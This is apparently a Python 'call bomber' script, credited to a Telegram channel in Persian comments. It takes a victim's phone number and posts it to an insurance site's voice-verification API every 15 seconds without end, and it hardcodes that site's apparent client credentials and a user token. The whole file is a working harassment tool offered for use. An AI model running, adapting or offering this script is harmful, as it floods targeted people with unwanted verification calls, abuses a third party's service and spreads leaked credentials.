
#سازنده و کد نویسی شده توسط M̥ͦI̥ͦL̥ͦḀͦD̥ͦ C̥ͦO̥ͦD̥ͦE̥ͦR̥ͦ
import requests
import time
import datetime
import os

RED = '\033[31m'
GREEN = '\033[32m'
BLUE = '\033[34m'
YELLOW = '\033[33m'
RESET = '\033[0m'

def send_verification_code(phone_number):
    url = "https://www.azki.co/api/vehicleorder/v2/app/auth/register-vocal-verify-code"

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
        'device': 'web',
        'deviceid': '6',
        'password': 'BimitoSecret',
        'origin': 'https://www.azki.com',
        'referer': 'https://www.azki.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
        'user-token': 'Gs0pn0o8sfSW1OYPjxAUKBPNjeT6FwYyrgE5OMnRP6eI4AzTAjIoPXV18YqIEZUN',
        'username': 'BimitoClient'
    }
    while True:
        data = {"phoneNumber": phone_number}
        response = requests.post(url=url, json=data, headers=headers)
        if response.status_code == 200:
            print(f"{GREEN}Request sent successfully.")
        else:
            print(f"{RED}Error in sending the request.")
        time.sleep(15)

if __name__ == "__main__":
    print(f'{BLUE} 𝓬𝓻𝓮𝓪𝓽𝓸𝓻 𝓶𝓻_𝓻𝓸𝓸𝓼𝓽𝓮𝓻')
    time.sleep(2)
    os.system("clear")
    number = input(f"{YELLOW}Enter the phone number: ")
    current_time = datetime.datetime.now()
    print(RED , current_time)
    send_verification_code(number)

# Channel: @Virtualservices_3
# سازنده = @Sorse_taper
